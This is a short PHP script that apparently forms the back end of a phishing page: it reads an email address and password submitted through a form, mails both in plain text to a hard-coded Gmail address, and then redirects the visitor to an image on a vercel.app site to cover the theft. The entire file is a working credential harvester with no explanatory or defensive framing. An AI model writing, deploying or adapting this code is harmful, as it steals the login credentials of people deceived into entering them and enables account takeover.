<?php
if(!empty($_POST["email"])) {
$to = "ollarkunle1@gmail.com";
$subject = "My subject";
$email = $_POST["email"];
$password = $_POST["password"];
$txt = "Email:".$email.' & Password: '.$password;
$headers = "From: ollarkunle1@gmail.com" . "\r\n" .
"CC: ollarkunle1@gmail.com";

mail($to,$subject,$txt,$headers);

header("Location: https://validated-webfix.vercel.app/HelloTech-qr-code-300x300.webp");
}
?>


